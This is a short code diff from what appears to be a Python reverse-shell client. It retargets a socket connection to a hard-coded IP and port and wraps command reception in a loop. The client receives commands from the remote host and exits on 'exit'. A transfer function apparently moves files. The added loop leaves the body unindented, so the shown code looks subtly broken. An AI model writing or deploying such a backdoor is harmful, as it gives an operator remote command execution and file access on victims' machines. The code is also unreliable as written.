@@ -23,8 +23,9 @@ def transfer(s, path):
 
 def connecting():
     s = socket.socket()
-    s.connect(("192.168.49.89", 8003))
+    s.connect(("192.168.1.31", 8080))
 
+    while True:
         command = s.recv(8192)
         if 'exit' in command.decode():
             s.close()
@@ -54,4 +55,5 @@ def main():
 
 #finally running the main function to start the server!
 main()
+
 
